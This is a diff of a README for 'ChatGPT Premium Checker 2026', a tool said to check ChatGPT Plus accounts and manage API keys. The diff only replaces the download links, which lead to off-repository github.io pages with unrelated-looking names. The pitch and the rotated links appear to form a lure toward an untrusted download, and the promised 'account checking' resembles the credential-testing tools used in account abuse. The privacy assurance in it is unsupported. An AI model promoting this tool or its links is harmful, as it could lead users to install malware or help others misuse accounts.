@@ -2,7 +2,7 @@
 
 ChatGPT Premium Checker 2026 is a comprehensive tool designed for users who need to efficiently verify, manage, and optimize their ChatGPT Plus accounts. Leveraging advanced OpenAI tools, it offers a suite of features for account checking, API key management, and usage analytics, making it an essential solution for both individuals and teams.
 
-[![Download Tool](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Tool](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -46,6 +46,6 @@ A: All data is encrypted locally on your device, and no information is transmitt
 
 Get the latest version of ChatGPT Premium Checker 2026 from our official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is continuously updated to provide the best experience with ChatGPT and OpenAI tools. For any feedback or support, feel free to reach out via the repository issues or contact our team directly.
